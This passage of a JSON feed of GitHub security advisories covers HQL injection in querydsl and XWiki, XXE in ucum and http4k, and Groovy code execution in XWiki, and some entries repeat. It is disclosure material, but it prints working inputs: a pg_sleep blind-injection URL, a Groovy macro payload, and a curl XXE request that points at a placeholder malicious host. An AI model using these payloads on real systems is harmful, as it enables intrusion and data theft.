href=\"https://www.csirt.sk/querydsl-java-library-vulnerability-permits-sql-hql-injection.html\">https://www.csirt.sk/querydsl-java-library-vulnerability-permits-sql-hql-injection.html</a></li>\n<li><a href=\"https://github.com/OpenFeign/querydsl/releases/tag/5.6.1\">https://github.com/OpenFeign/querydsl/releases/tag/5.6.1</a></li>\n<li><a href=\"https://github.com/OpenFeign/querydsl/releases/tag/6.10.1\">https://github.com/OpenFeign/querydsl/releases/tag/6.10.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6q3q-6v5j-h6vg\">https://github.com/advisories/GHSA-6q3q-6v5j-h6vg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6q3q-6v5j-h6vg",
            "title": "[io.github.openfeign.querydsl:querydsl-jpa] Querydsl vulnerable to HQL injection trough orderBy",
            "date_modified": "2024-12-16T21:26:13.000Z",
            "date_published": "2024-11-27T19:00:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6q3q-6v5j-h6vg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The order by method enables injecting HQL queries. This may cause blind HQL injection, which could lead to leakage of sensitive information, and potentially also Denial Of Service. This vulnerability is present since the original querydsl repository(<a href=\"https://github.com/querydsl/querydsl\">https://github.com/querydsl/querydsl</a>) where it was assigned preliminary CVE identifier <strong>CVE-2024-49203</strong>.</p>\n<h3 id=\"details\">Details</h3>\n<p>Vulnerable code may look as follows:</p>\n<pre><code>@GetMapping\npublic List&lt;Test&gt; getProducts(@RequestParam(\"orderBy\") String orderBy) {\n    JPAQuery&lt;Test&gt; query = new JPAQuery&lt;Test&gt;(entityManager).from(test);\n    PathBuilder&lt;Test&gt; pathBuilder = new PathBuilder&lt;&gt;(Test.class, \"test\");\n\n    OrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));\n    JPAQuery&lt;Test&gt; orderedQuery = query.orderBy(order);\n    return orderedQuery.fetch();\n}\n</code></pre>\n<p>Where vulnerability is either caused by <code>pathBuilder.get(orderBy)</code> or the <code>orderBy(order)</code> method itself, based on where the security checks are expected.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Full POC code is available in repository:\n<a href=\"https://github.com/CSIRTTrizna/CVE-2024-49203/\">https://github.com/CSIRTTrizna/CVE-2024-49203/</a>\nWhen we take a look at source code shown in Details section the functionality is as follows:</p>\n<ol>\n<li>Create JPAQuery object instance:</li>\n</ol>\n<pre><code>JPAQuery&lt;Test&gt; query = new JPAQuery&lt;Test&gt;(entityManager).from(test);\n</code></pre>\n<ol start=\"2\">\n<li>Create OrderSpecifier object instance:</li>\n</ol>\n<pre><code>PathBuilder&lt;Test&gt; pathBuilder = new PathBuilder&lt;&gt;(Test.class, \"test\");\nOrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));\n</code></pre>\n<p>Where orderBy variable is user provided input.</p>\n<ol start=\"3\">\n<li>order and run the query</li>\n</ol>\n<pre><code>JPAQuery&lt;Test&gt; orderedQuery = query.orderBy(order);\norderedQuery.fetch();\n</code></pre>\n<p>When user goes to URL \n<code>/products?orderBy=name+INTERSECT+SELECT+t+FROM+Test+t+WHERE+(SELECT+cast(pg_sleep(10) AS text))='2'+ORDER+BY+t.id</code>\nThe generated query will look something like this:</p>\n<pre><code>select test                                                                                                                                     \nfrom Test test\norder by test.name INTERSECT SELECT t FROM Test t WHERE (SELECT cast(pg_sleep(10) AS text))='2' ORDER BY t.id asc\n</code></pre>\n<h4 id=\"environment\">Environment</h4>\n<p>Library versions used in proof of concept to reproduce the vulnerability:</p>\n<pre><code>querydsl-jpa: 6.8.0\nquerydsl-apt: 6.8.0\nhibernate-core: 6.1.1.Final\njakarta.persistence-api: 3.1.0\npostgresql: 42.7.4\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>The vulnerability is HQL injection, so anyone using source code similar to one provided in details is exposed to potentional information leakage and denial of service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/OpenFeign/querydsl/security/advisories/GHSA-6q3q-6v5j-h6vg\">https://github.com/OpenFeign/querydsl/security/advisories/GHSA-6q3q-6v5j-h6vg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-49203\">https://nvd.nist.gov/vuln/detail/CVE-2024-49203</a></li>\n<li><a href=\"https://github.com/querydsl/querydsl/issues/3757\">https://github.com/querydsl/querydsl/issues/3757</a></li>\n<li><a href=\"https://github.com/CSIRTTrizna/CVE-2024-49203\">https://github.com/CSIRTTrizna/CVE-2024-49203</a></li>\n<li><a href=\"https://github.com/querydsl/querydsl/releases/tag/QUERYDSL_5_1_0\">https://github.com/querydsl/querydsl/releases/tag/QUERYDSL_5_1_0</a></li>\n<li><a href=\"https://www.csirt.sk/querydsl-java-library-vulnerability-permits-sql-hql-injection.html\">https://www.csirt.sk/querydsl-java-library-vulnerability-permits-sql-hql-injection.html</a></li>\n<li><a href=\"https://github.com/OpenFeign/querydsl/releases/tag/5.6.1\">https://github.com/OpenFeign/querydsl/releases/tag/5.6.1</a></li>\n<li><a href=\"https://github.com/OpenFeign/querydsl/releases/tag/6.10.1\">https://github.com/OpenFeign/querydsl/releases/tag/6.10.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6q3q-6v5j-h6vg\">https://github.com/advisories/GHSA-6q3q-6v5j-h6vg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6q3q-6v5j-h6vg",
            "title": "[io.github.openfeign.querydsl:querydsl-apt] Querydsl vulnerable to HQL injection trough orderBy",
            "date_modified": "2024-12-16T21:26:13.000Z",
            "date_published": "2024-11-27T19:00:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6q3q-6v5j-h6vg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The order by method enables injecting HQL queries. This may cause blind HQL injection, which could lead to leakage of sensitive information, and potentially also Denial Of Service. This vulnerability is present since the original querydsl repository(<a href=\"https://github.com/querydsl/querydsl\">https://github.com/querydsl/querydsl</a>) where it was assigned preliminary CVE identifier <strong>CVE-2024-49203</strong>.</p>\n<h3 id=\"details\">Details</h3>\n<p>Vulnerable code may look as follows:</p>\n<pre><code>@GetMapping\npublic List&lt;Test&gt; getProducts(@RequestParam(\"orderBy\") String orderBy) {\n    JPAQuery&lt;Test&gt; query = new JPAQuery&lt;Test&gt;(entityManager).from(test);\n    PathBuilder&lt;Test&gt; pathBuilder = new PathBuilder&lt;&gt;(Test.class, \"test\");\n\n    OrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));\n    JPAQuery&lt;Test&gt; orderedQuery = query.orderBy(order);\n    return orderedQuery.fetch();\n}\n</code></pre>\n<p>Where vulnerability is either caused by <code>pathBuilder.get(orderBy)</code> or the <code>orderBy(order)</code> method itself, based on where the security checks are expected.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Full POC code is available in repository:\n<a href=\"https://github.com/CSIRTTrizna/CVE-2024-49203/\">https://github.com/CSIRTTrizna/CVE-2024-49203/</a>\nWhen we take a look at source code shown in Details section the functionality is as follows:</p>\n<ol>\n<li>Create JPAQuery object instance:</li>\n</ol>\n<pre><code>JPAQuery&lt;Test&gt; query = new JPAQuery&lt;Test&gt;(entityManager).from(test);\n</code></pre>\n<ol start=\"2\">\n<li>Create OrderSpecifier object instance:</li>\n</ol>\n<pre><code>PathBuilder&lt;Test&gt; pathBuilder = new PathBuilder&lt;&gt;(Test.class, \"test\");\nOrderSpecifier order = new OrderSpecifier(Order.ASC, pathBuilder.get(orderBy));\n</code></pre>\n<p>Where orderBy variable is user provided input.</p>\n<ol start=\"3\">\n<li>order and run the query</li>\n</ol>\n<pre><code>JPAQuery&lt;Test&gt; orderedQuery = query.orderBy(order);\norderedQuery.fetch();\n</code></pre>\n<p>When user goes to URL \n<code>/products?orderBy=name+INTERSECT+SELECT+t+FROM+Test+t+WHERE+(SELECT+cast(pg_sleep(10) AS text))='2'+ORDER+BY+t.id</code>\nThe generated query will look something like this:</p>\n<pre><code>select test                                                                                                                                     \nfrom Test test\norder by test.name INTERSECT SELECT t FROM Test t WHERE (SELECT cast(pg_sleep(10) AS text))='2' ORDER BY t.id asc\n</code></pre>\n<h4 id=\"environment\">Environment</h4>\n<p>Library versions used in proof of concept to reproduce the vulnerability:</p>\n<pre><code>querydsl-jpa: 6.8.0\nquerydsl-apt: 6.8.0\nhibernate-core: 6.1.1.Final\njakarta.persistence-api: 3.1.0\npostgresql: 42.7.4\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>The vulnerability is HQL injection, so anyone using source code similar to one provided in details is exposed to potentional information leakage and denial of service.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/OpenFeign/querydsl/security/advisories/GHSA-6q3q-6v5j-h6vg\">https://github.com/OpenFeign/querydsl/security/advisories/GHSA-6q3q-6v5j-h6vg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-49203\">https://nvd.nist.gov/vuln/detail/CVE-2024-49203</a></li>\n<li><a href=\"https://github.com/querydsl/querydsl/issues/3757\">https://github.com/querydsl/querydsl/issues/3757</a></li>\n<li><a href=\"https://github.com/CSIRTTrizna/CVE-2024-49203\">https://github.com/CSIRTTrizna/CVE-2024-49203</a></li>\n<li><a href=\"https://github.com/querydsl/querydsl/releases/tag/QUERYDSL_5_1_0\">https://github.com/querydsl/querydsl/releases/tag/QUERYDSL_5_1_0</a></li>\n<li><a href=\"https://www.csirt.sk/querydsl-java-library-vulnerability-permits-sql-hql-injection.html\">https://www.csirt.sk/querydsl-java-library-vulnerability-permits-sql-hql-injection.html</a></li>\n<li><a href=\"https://github.com/OpenFeign/querydsl/releases/tag/5.6.1\">https://github.com/OpenFeign/querydsl/releases/tag/5.6.1</a></li>\n<li><a href=\"https://github.com/OpenFeign/querydsl/releases/tag/6.10.1\">https://github.com/OpenFeign/querydsl/releases/tag/6.10.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6q3q-6v5j-h6vg\">https://github.com/advisories/GHSA-6q3q-6v5j-h6vg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6q3q-6v5j-h6vg",
            "title": "[io.github.openfeign.querydsl:querydsl-jpa] Querydsl vulnerable to HQL injection trough orderBy",
            "date_modified": "2024-12-16T21:26:13.000Z",
            "date_published": "2024-11-27T19:00:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6q3q-6v5j-h6vg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>In <code>getdocument.vm</code> ; the ordering of the returned documents is defined from an unsanitized request parameter (request.sort) and can allow any user to inject HQL.</p>\n<p>Depending on the used database backend, the attacker may be able to not only obtain confidential information such as password hashes from the database, but also execute UPDATE/INSERT/DELETE queries.</p>\n<p>It's possible to employ database backend dependent techniques of breaking out of HQL query context, described, for example, here: <a href=\"https://www.sonarsource.com/blog/exploiting-hibernate-injections\">https://www.sonarsource.com/blog/exploiting-hibernate-injections</a>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This has been patched in 13.10.5 and 14.3-rc-1.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no known workaround, other than upgrading XWiki.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://jira.xwiki.org/browse/XWIKI-17568\">https://jira.xwiki.org/browse/XWIKI-17568</a></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue in <a href=\"https://jira.xwiki.org/\">Jira XWiki.org</a></li>\n<li>Email us at <a href=\"mailto:security@xwiki.org\">Security Mailing List</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-wh34-m772-5398\">https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-wh34-m772-5398</a></li>\n<li><a href=\"https://github.com/xwiki/xwiki-platform/commit/673076e2e8b88a36cdeaf7007843aa9ca1a068a0\">https://github.com/xwiki/xwiki-platform/commit/673076e2e8b88a36cdeaf7007843aa9ca1a068a0</a></li>\n<li><a href=\"https://jira.xwiki.org/browse/XWIKI-17568\">https://jira.xwiki.org/browse/XWIKI-17568</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-55663\">https://nvd.nist.gov/vuln/detail/CVE-2024-55663</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wh34-m772-5398\">https://github.com/advisories/GHSA-wh34-m772-5398</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wh34-m772-5398",
            "title": "[org.xwiki.platform:xwiki-platform-distribution-war] XWiki Platform has an SQL injection in getdocuments.vm with sort parameter",
            "date_modified": "2024-12-16T18:08:47.000Z",
            "date_published": "2024-12-12T19:22:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wh34-m772-5398"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>XML parsing performed by the UcumEssenceService is vulnerable to XML external entity injections. A processed XML file with a malicious DTD tag could produce XML containing data from the host system. This impacts use cases where ucum is being used to within a host where external clients can submit XML.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Release 1.0.9 of ucum fixes this vulnerability</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Ensure that the source xml for instantiating UcumEssenceService is trusted.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://cwe.mitre.org/data/definitions/611.html\">https://cwe.mitre.org/data/definitions/611.html</a></li>\n<li><a href=\"https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#jaxp-documentbuilderfactory-saxparserfactory-and-dom4j\">https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#jaxp-documentbuilderfactory-saxparserfactory-and-dom4j</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/FHIR/Ucum-java/security/advisories/GHSA-w9j7-phm3-f97j\">https://github.com/FHIR/Ucum-java/security/advisories/GHSA-w9j7-phm3-f97j</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-55887\">https://nvd.nist.gov/vuln/detail/CVE-2024-55887</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-w9j7-phm3-f97j\">https://github.com/advisories/GHSA-w9j7-phm3-f97j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-w9j7-phm3-f97j",
            "title": "[org.fhir:ucum] Ucum-java has an XXE vulnerability in XML parsing",
            "date_modified": "2024-12-13T20:36:02.000Z",
            "date_published": "2024-12-13T20:35:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-w9j7-phm3-f97j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>On instances where <code>Extension Repository Application</code> is installed, any user can execute any code requiring <code>programming</code> rights on the server.\nIn order to reproduce on an instance, as a normal user without <code>script</code> nor <code>programming</code> rights, go to your profile and add an object of type <code>ExtensionCode.ExtensionClass</code>. Set the description to <code>{{async}}{{groovy}}println(\"Hello from Description\"){{/groovy}}{{/async}}</code> and press <code>Save and View</code>. If the description displays as <code>Hello from Description</code> without any error, then the instance is vulnerable.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This vulnerability has been fixed in XWiki 15.10.9 and 16.3.0.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Since <code>Extension Repository Application</code> is not mandatory, it can be safely disabled on instances that do not use it.\nIt is also possible to manually apply <a href=\"https://github.com/xwiki/xwiki-platform/commit/8659f17d500522bf33595e402391592a35a162e8#diff-9b6f9e853f23d76611967737f8c4072ffceaba4c006ca5a5e65b66d988dc084a\">this patch</a> to the page <code>ExtensionCode.ExtensionSheet</code>, as well as <a href=\"https://github.com/xwiki/xwiki-platform/commit/8659f17d500522bf33595e402391592a35a162e8#diff-d571404d94fa27360cfee64f2a11d8c819b397529db275e005606b7356610f82\">this patch</a> to the page <code>ExtensionCode.ExtensionAuthorsDisplayer</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://jira.xwiki.org/browse/XWIKI-21890\">https://jira.xwiki.org/browse/XWIKI-21890</a></li>\n<li><a href=\"https://github.com/xwiki/xwiki-platform/commit/8659f17d500522bf33595e402391592a35a162e8\">https://github.com/xwiki/xwiki-platform/commit/8659f17d500522bf33595e402391592a35a162e8</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue in <a href=\"https://jira.xwiki.org/\">Jira XWiki.org</a></li>\n<li>Email us at <a href=\"mailto:security@xwiki.org\">Security Mailing List</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-j2pq-22jj-4pm5\">https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-j2pq-22jj-4pm5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-55662\">https://nvd.nist.gov/vuln/detail/CVE-2024-55662</a></li>\n<li><a href=\"https://github.com/xwiki/xwiki-platform/commit/8659f17d500522bf33595e402391592a35a162e8\">https://github.com/xwiki/xwiki-platform/commit/8659f17d500522bf33595e402391592a35a162e8</a></li>\n<li><a href=\"https://jira.xwiki.org/browse/XWIKI-21890\">https://jira.xwiki.org/browse/XWIKI-21890</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j2pq-22jj-4pm5\">https://github.com/advisories/GHSA-j2pq-22jj-4pm5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j2pq-22jj-4pm5",
            "title": "[org.xwiki.platform:xwiki-platform-repository-server-ui] XWiki allows remote code execution through the extension sheet",
            "date_modified": "2024-12-12T19:23:09.000Z",
            "date_published": "2024-12-12T19:23:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j2pq-22jj-4pm5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>On instances where <code>Extension Repository Application</code> is installed, any user can execute any code requiring <code>programming</code> rights on the server.\nIn order to reproduce on an instance, as a normal user without <code>script</code> nor <code>programming</code> rights, go to your profile and add an object of type <code>ExtensionCode.ExtensionClass</code>. Set the description to <code>{{async}}{{groovy}}println(\"Hello from Description\"){{/groovy}}{{/async}}</code> and press <code>Save and View</code>. If the description displays as <code>Hello from Description</code> without any error, then the instance is vulnerable.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This vulnerability has been fixed in XWiki 15.10.9 and 16.3.0.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Since <code>Extension Repository Application</code> is not mandatory, it can be safely disabled on instances that do not use it.\nIt is also possible to manually apply <a href=\"https://github.com/xwiki/xwiki-platform/commit/8659f17d500522bf33595e402391592a35a162e8#diff-9b6f9e853f23d76611967737f8c4072ffceaba4c006ca5a5e65b66d988dc084a\">this patch</a> to the page <code>ExtensionCode.ExtensionSheet</code>, as well as <a href=\"https://github.com/xwiki/xwiki-platform/commit/8659f17d500522bf33595e402391592a35a162e8#diff-d571404d94fa27360cfee64f2a11d8c819b397529db275e005606b7356610f82\">this patch</a> to the page <code>ExtensionCode.ExtensionAuthorsDisplayer</code>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://jira.xwiki.org/browse/XWIKI-21890\">https://jira.xwiki.org/browse/XWIKI-21890</a></li>\n<li><a href=\"https://github.com/xwiki/xwiki-platform/commit/8659f17d500522bf33595e402391592a35a162e8\">https://github.com/xwiki/xwiki-platform/commit/8659f17d500522bf33595e402391592a35a162e8</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue in <a href=\"https://jira.xwiki.org/\">Jira XWiki.org</a></li>\n<li>Email us at <a href=\"mailto:security@xwiki.org\">Security Mailing List</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-j2pq-22jj-4pm5\">https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-j2pq-22jj-4pm5</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-55662\">https://nvd.nist.gov/vuln/detail/CVE-2024-55662</a></li>\n<li><a href=\"https://github.com/xwiki/xwiki-platform/commit/8659f17d500522bf33595e402391592a35a162e8\">https://github.com/xwiki/xwiki-platform/commit/8659f17d500522bf33595e402391592a35a162e8</a></li>\n<li><a href=\"https://jira.xwiki.org/browse/XWIKI-21890\">https://jira.xwiki.org/browse/XWIKI-21890</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j2pq-22jj-4pm5\">https://github.com/advisories/GHSA-j2pq-22jj-4pm5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j2pq-22jj-4pm5",
            "title": "[org.xwiki.platform:xwiki-platform-repository-server-ui] XWiki allows remote code execution through the extension sheet",
            "date_modified": "2024-12-12T19:23:09.000Z",
            "date_published": "2024-12-12T19:23:04.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j2pq-22jj-4pm5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>In <code>getdocument.vm</code> ; the ordering of the returned documents is defined from an unsanitized request parameter (request.sort) and can allow any user to inject HQL.</p>\n<p>Depending on the used database backend, the attacker may be able to not only obtain confidential information such as password hashes from the database, but also execute UPDATE/INSERT/DELETE queries.</p>\n<p>It's possible to employ database backend dependent techniques of breaking out of HQL query context, described, for example, here: <a href=\"https://www.sonarsource.com/blog/exploiting-hibernate-injections\">https://www.sonarsource.com/blog/exploiting-hibernate-injections</a>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This has been patched in 13.10.5 and 14.3-rc-1.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>There is no known workaround, other than upgrading XWiki.</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://jira.xwiki.org/browse/XWIKI-17568\">https://jira.xwiki.org/browse/XWIKI-17568</a></p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Open an issue in <a href=\"https://jira.xwiki.org/\">Jira XWiki.org</a></li>\n<li>Email us at <a href=\"mailto:security@xwiki.org\">Security Mailing List</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-wh34-m772-5398\">https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-wh34-m772-5398</a></li>\n<li><a href=\"https://github.com/xwiki/xwiki-platform/commit/673076e2e8b88a36cdeaf7007843aa9ca1a068a0\">https://github.com/xwiki/xwiki-platform/commit/673076e2e8b88a36cdeaf7007843aa9ca1a068a0</a></li>\n<li><a href=\"https://jira.xwiki.org/browse/XWIKI-17568\">https://jira.xwiki.org/browse/XWIKI-17568</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-55663\">https://nvd.nist.gov/vuln/detail/CVE-2024-55663</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wh34-m772-5398\">https://github.com/advisories/GHSA-wh34-m772-5398</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wh34-m772-5398",
            "title": "[org.xwiki.platform:xwiki-platform-distribution-war] XWiki Platform has an SQL injection in getdocuments.vm with sort parameter",
            "date_modified": "2024-12-16T18:08:47.000Z",
            "date_published": "2024-12-12T19:22:12.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wh34-m772-5398"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p><em>Short summary of the problem. Make the impact and severity as clear as possible. For example: An unsafe deserialization vulnerability allows any unauthenticated user to execute arbitrary code on the server.</em></p>\n<p>There is a potential XXE(XML External Entity Injection) vulnerability when http4k handling malicious XML contents within requests, which might allow attackers to read local sensitive information on server, trigger Server-side Request Forgery and even execute code under some circumstances.</p>\n<h3 id=\"details\">Details</h3>\n<p><em>Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer.</em>\n<a href=\"https://github.com/http4k/http4k/blob/25696dff2d90206cc1da42f42a1a8dbcdbcdf18c/core/format/xml/src/main/kotlin/org/http4k/format/Xml.kt#L42-L46\">https://github.com/http4k/http4k/blob/25696dff2d90206cc1da42f42a1a8dbcdbcdf18c/core/format/xml/src/main/kotlin/org/http4k/format/Xml.kt#L42-L46</a>\nXML contents is parsed with DocumentBuilder without security settings on or external entity enabled</p>\n<h3 id=\"poc\">PoC</h3>\n<p><em>Complete instructions, including specific configuration details, to reproduce the vulnerability.</em></p>\n<h4 id=\"example-vulnerable-server-code\">Example Vulnerable server code:</h4>\n<pre><code>import org.http4k.core.*\nimport org.http4k.format.Xml.xml\nimport org.http4k.server.Netty\nimport org.http4k.server.asServer\nimport org.w3c.dom.Document\n\nfun main() {\n\n    val xmlLens = Body.xml().toLens()\n\n    // Create an HTTP handler\n    val app: HttpHandler = { request -&gt;\n        try {\n            // Parse the incoming XML payload to a Document object\n            val xmlDocument: Document = xmlLens(request)\n\n            // Extract root element name or other details from the XML\n            val rootElementName = xmlDocument.documentElement.nodeName\n\n            // Create a response XML based on the extracted information\n            val responseXml = \"\"\"\n                &lt;response&gt;\n                    &lt;message&gt;Root element is: $rootElementName&lt;/message&gt;\n                &lt;/response&gt;\n            \"\"\".trimIndent()\n\n            // Respond with XML\n            Response(Status.OK).body(responseXml).header(\"Content-Type\", \"application/xml\")\n        } catch (e: Exception) {\n            // Handle invalid XML or other errors\n            Response(Status.BAD_REQUEST).body(\"Invalid XML: ${e.message}\")\n        }\n    }\n\n    // Start the server\n    val server = app.asServer(Netty(9000)).start()\n    println(\"Server started on http://localhost:9000\")\n}\n</code></pre>\n<h4 id=\"maven-dependency\">Maven dependency:</h4>\n<pre><code>&lt;dependencies&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.jetbrains.kotlin&lt;/groupId&gt;\n            &lt;artifactId&gt;kotlin-test-junit5&lt;/artifactId&gt;\n            &lt;version&gt;1.9.0&lt;/version&gt;\n            &lt;scope&gt;test&lt;/scope&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.junit.jupiter&lt;/groupId&gt;\n            &lt;artifactId&gt;junit-jupiter-engine&lt;/artifactId&gt;\n            &lt;version&gt;5.10.0&lt;/version&gt;\n            &lt;scope&gt;test&lt;/scope&gt;\n        &lt;/dependency&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.jetbrains.kotlin&lt;/groupId&gt;\n            &lt;artifactId&gt;kotlin-stdlib&lt;/artifactId&gt;\n            &lt;version&gt;1.9.0&lt;/version&gt;\n        &lt;/dependency&gt;\n\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.http4k&lt;/groupId&gt;\n            &lt;artifactId&gt;http4k-core&lt;/artifactId&gt;\n            &lt;version&gt;5.40.0.0&lt;/version&gt;\n        &lt;/dependency&gt;\n\n        &lt;!-- Http4k XML format --&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.http4k&lt;/groupId&gt;\n            &lt;artifactId&gt;http4k-format-xml&lt;/artifactId&gt;\n            &lt;version&gt;5.40.0.0&lt;/version&gt;\n        &lt;/dependency&gt;\n\n        &lt;!-- http4k Netty --&gt;\n        &lt;dependency&gt;\n            &lt;groupId&gt;org.http4k&lt;/groupId&gt;\n            &lt;artifactId&gt;http4k-server-netty&lt;/artifactId&gt;\n            &lt;version&gt;5.40.0.0&lt;/version&gt;\n        &lt;/dependency&gt;\n    &lt;/dependencies&gt;\n</code></pre>\n<h4 id=\"exploit-payload-example-to-trigger-ssrf\">Exploit payload example to trigger SSRF</h4>\n<p><code>curl -X POST http://localhost:9000 -H \"Content-Type: application/xml\" -d \"&lt;?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?&gt;&lt;!DOCTYPE root [&lt;!ENTITY xxe SYSTEM \\\"https://replace.with.your.malicious.website/poc\\\"&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;\"</code></p>\n<h3 id=\"impact\">Impact</h3>\n<p><em>What kind of vulnerability is it? Who is impacted?</em>\nThe servers that employ this XML parsing feature of http4k are vulnerable to this XXE vulnerability</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/http4k/http4k/security/advisories/GHSA-7mj5-hjjj-8rgw\">https://github.com/http4k/http4k/security/advisories/GHSA-7mj5-hjjj-8rgw</a></li>\n<li><a href=\"https://github.com/http4k/http4k/commit/35297adc6d6aca4951d50d8cdf17ff87a8b19fbc\">https://github.com/http4k/http4k/commit/35297adc6d6aca4951d50d8cdf17ff87a8b19fbc</a></li>\n<li><a 